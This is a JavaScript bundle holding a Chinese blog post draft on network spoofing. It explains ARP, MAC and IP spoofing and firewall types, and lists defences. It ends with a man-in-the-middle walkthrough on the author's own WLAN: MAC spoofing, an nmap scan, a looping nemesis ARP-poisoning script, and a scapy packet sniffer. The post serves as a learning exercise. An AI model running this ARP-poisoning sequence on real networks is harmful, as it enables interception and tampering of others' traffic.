webpackJsonp([85,194],{544:function(n,e){n.exports={rawContent:'\n\n首先，我们来被维基百科科普一下。然后试着执行一次中间人攻击。\n\n# 理论基础\n\n- 理解计算机网络分层架构。\n\n- 习惯于主动使用搜索引擎寻找知识\n\n以下内容来自维基百科\n\n# Arp Spoofing\n\n是一种攻击者在局域网上发送伪造的ARP消息的技术。通常是为了将另一个主机的IP地址关联到攻击者的MAC地址上。使那个主机的IP地址的流量定向到攻击者那里。\n\nARP欺骗使攻击者截取本地局域网(LAN)上的数据帧，更改流量或者阻止流量。通常作为其它攻击方式比如拒绝服务攻击(DOS)，中间人攻击(MITM)或者会话劫持的开始。\n\n攻击局限在使用ARP协议的局域网上。\n\n局域网通信需要把网络层的IP地址转换成数据链路层的MAC地址\n来在数据链路层传输。当知道一个主机的IP地址后，就需要通过一个广播来获取其MAC地址(ARP request)。这个主机响应(ARP reply)中包含这个IP的MAC地址。\n\nARP协议没有状态，主机会自动缓存任何它们收到的ARP reply，无论是否它们请求过。即使没有过期的ARP缓存也会被新ARP响应覆盖。主机无法认证包的来源。\n\n通常，一次ARP攻击可能来自被侵害的机器或者直接是攻击者的主机。通常，攻击的目标是将攻击者的MAC地址关联到目标机器的IP地址，于是意味着发送到目标的流量就被送到攻击者的那里。攻击者可以：\n\n- 截取数据，然后原封不动转发给目标。(窃听)\n- 更改数据内容再转发给目标(MITM)\n- 通过丢弃所有或部分包对目标发起DOS攻击\n\n防御措施有：\n\n- 静态ARP表。\n- 一些软件通过某种形式的认证或交叉检查ARP响应的方式。DHCP服务器、独立主机、Ethernet交换机或其它网络设备都能有这种功能。比如多IP关联到一个MAC地址可能就预示着ARP欺骗。\n- 操作系统反应不一。Linux忽略任何不请自来的响应，但使用其它机器的可见请求来更新缓存。Solaris只在超时后更新缓存条目。Windows中，可以在`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters, ArpCacheLife, ArpCacheMinReferenceLife, ArpUseEtherSNAP, ArpTRSingleRoute, ArpAlwaysSourceRoute, ArpRetryCount`配置。\n- 主机防御。可能拒绝任何和缓存中MAC地址不同的应答更新，可能接受不同的但会探测之前的MAC地址是否还在。这些是基于已有的缓存中MAC地址是合法的基础上。[^4]\n- 被动探测。探测网络上的ARP请求和响应建立一个IP-MAC数据库\n- DHCP服务器在分配IP后建立和维护对应的列表供网关使用。\n\n# Mac Spoofing\n\n是一种更改一个网络设备上接口的MAC(Media Access Control)地址的技术。MAC地址硬编码到网卡(NetWork Interface Controller)中无法更改，然而，有办法让操作系统相信网卡使用了用户指定的MAC地址。通常这更改了一个电脑的身份，然而相当简单。\n\n通常为了绕过服务器或路由器的访问控制列表，或者隐藏一台电脑或者冒充其它网络设备。看情况有时候合法有时候非法。\n\n- 为了在使用绑定MAC的ISP上使用新硬件或多个硬件。不过攻击者也能使用该技术。\n- 为了满足某些绑定MAC地址的软件要求\n- 身份隐藏以保护隐私。Wi-Fi连接MAC地址并不加密。因此monitor模式下网卡很容易搜集MAC地址。为了不被追踪可以使用MAC欺骗，然而攻击者可以用此技术冒充认证用户实行非法活动，并且难以探测。\n\nMAC欺骗的主机通常可以收到信息(有些特别安全交换机配置可以阻止这种包的传输)[^2]，然而，MAC地址伪造局限在局部广播域。[^3]\n\n# IP Spoofing\n\n是在IP协议包中伪造源地址的一种行为。其一是为了隐藏伪造者的身份，一是为了假扮成其它机器。\n\n攻击者通过更改IP包头源地址段，使之好像来源于其它机器。收到伪造包的机器就向错误的机器返回包。通常攻击者不在乎返回的包，或者他们可以可靠地探测响应。\n\n特定情况下可能攻击者可以看到或把数据包重定向到他自己的机器。这在本地局域网或本地无线局域网上常常发生。\n\nIP欺骗常用来进行DOS攻击，因为包来自不同地址，它让过滤变得不易。这让基于IP的防御不再有效。Backscatter是一种基于无效地址包的统计技术，然而更复杂的攻击还能避免无效的地址。\n\nIP欺骗也被用来绕过基于IP的认证。虽然这种方法会一次更改上千的包使之在攻击远端系统时实施非常困难，但在受信任的内网机器之间却很有效\n\nIP欺骗有时候也用作网站性能测试。\n\n易受IP欺骗的服务有：\n\n- RPC\n- 任何基于IP的认证\n- X window系统\n- R(emote)系列服务比如rlogin，rsh\n\n### 防御方式\n\n- 包过滤。网关对出口或者入口包进行IP地址过滤，比如urpf(unicast Reverse Path Forwarding)。\n- 设计不是基于IP的网络协议和服务\n- 一些上层协议提供一些抵御。比如TCP使用序号来和远端机器通信来确保到达的包是已经建立连接的一部分。因攻击者通常看不到任何回应包，必须猜测序号来劫持连接。一些较老的系统或网络设备的TCP序号可以被预测。\n\n# Email Spoofing\n\n以后再看，其实某次我们内网搭建的git服务器给我邮箱发了邮件并且收到时就想到了这个。\n\n# URL Spoofing\n\n以后再说吧，想起了乌云上那篇猥琐流URL hacking。\n\n# FireWall\n\n从发展史来看，防火墙的发展分为三代：\n\n1. 包过滤。这一代防火墙仅仅对单个的包进行过滤。如果发现匹配的规则则丢弃(悄悄丢包)或者拒绝(返回错误)这个包。通常这些规则是包源地址、目的地址、协议、和比如针对TCP和UDP的端口。它没有关于连接的任何信息，是无状态的。\n\n    该代防火墙主要工作在下三层并稍微偷看下传输层的源和目的地址及端口。\n\n2. 有状态的过滤。不仅有第一代防火墙的功能，还工作到OSI第四层传输层上，会把`连接状态`作为一个评价标准。它会保留直到接受足够的包来决定它的连接状态。它记录所有经过的连接并决定是否一个包是新连接的开始或是已存在连接的一部分或者不是。\n\n3. 应用级防火墙[^1]。这种防火墙工作在应用层。它能够理解上层协议，所以，可以去探测是否一个非法的协议在试图通过合法的端口穿越防火墙。传说中的下一代防火墙(NGFW)就是扩展和深化应用层栈的检查。\n\n防火墙可以根据通信被截取的位置和被追踪的状态分类：\n\n- 网络层或包过滤\n   主要工作在相对底层的TCP/IP层，靠规则过滤。有两种：\n   - 有状态：存储当前连接阶段，源目的地址端口。若一个包不属于已经存在的连接，通过新连接的规则评价它。如果一个包属于已知的连接，则按所在连接处理方式处理\n   - 无状态。需要更少内存、更快。适于处理无连接的协议。然而不能基于通信状态做出复杂决定。\n   一个例子就是iptables\n\n- 应用层防火墙：通过套接字截取进程间通信，使用各种规则过滤。无法抵御底层的漏洞挖掘，正在被一种强制访问控制(MAC)应用防火墙取代，即沙盒。\n\n- 代理：无论是专用的硬件或者软件，通过以应用的方式响应输入的包起作用。代理服务器是一个网络到另一个特定网络应用的网关，代表网络中的用户来行事。代理服务器使内网和外网隔离更彻底，但攻击者也可以通过使用一台机器当作代理攻击内部网络。\n\n- NAT——网络地址转换：防火墙通常有这些功能，防火墙后的机器通常拥有私有IP地址。本来用来减缓ipv4地址不够用的危机的措施，却意外成为一种反网络侦查的重要防御手段。\n\n# Rogue DHCP\n\n伪造DHCP服务器，暂略。\n\n# DNS系列\n\n放到DNS里来讲\n\n------------------------------------\n\n下面，尝试一次中间人攻击，我是在WLAN内打开自己手机和笔记本。\n\n0.0 mac spoofing\n\n    ~ ⮀ sudo ip link set eth0 down\n    ~ ⮀ sudo ip link set dev eth0 address 38:AA:3C:E6:FE:69\n    ~ ⮀ ip link set eth0 up\n\n0.1 prepare\n\n    ~ ⮀ ifconfig wlan0 promisc\n    ~ ⮀ echo 1 > /proc/sys/net/ipv4/ip_forward\n\n1. find target machine\n\n    ~ ⮀ sudo nmap -sS 192.168.1.0/24\n\n2. arps it\n\n```bash\nwhile true\n\ndo\n\nsudo nemesis arp -v -r -d wlan0 -S 192.168.1.102 -D 192.168.1.1 -h E8:39:DF:08:F4:FB -m EC:88:8F:B4:D6:68 -H  E8:39:DF:08:F4:FB -M EC:88:8F:B4:D6:68\n\nsudo nemesis arp -v -r -d wlan0 -S 192.168.1.1 -D 192.168.1.102 -h E8:39:DF:08:F4:FB -m 68:5D:43:2E:AA:59 -H  E8:39:DF:08:F4:FB -M 68:5D:43:2E:AA:59\n\ndone\n\n```\n\n3. listen it\n\n    pkts = sniff(filter="tcp and host 192.168.1.102",iface="wlan0", prn=lambda x: sprintf("{IP:%IP.src% -> %IP.dst%\\n}{Raw:%Raw.load%\\n}"))\n\n4. check it\n\n## Footnotes\n\n[^1]: SDN么这是？\n[^2]: 我拿自己手机试了下，大概这种特安全的地方很少吧。\n[^3]: [这里解释了为啥是在局域网内](http://stackoverflow.com/questions/10633753/nmap-not-retrieving-mac-address-and-vendor)\n[^4]: 一般通过dhcp服务器分配ip地址的大概就没什么问题。不过要是伪造dhcp服务器……啧啧……\n',metaData:{layout:"post",title:"网络上的欺骗",excerpt:"各种spoofing技术相关理论基础",category:"security",tags:["security"],disqus:!0,draft:!0}}}});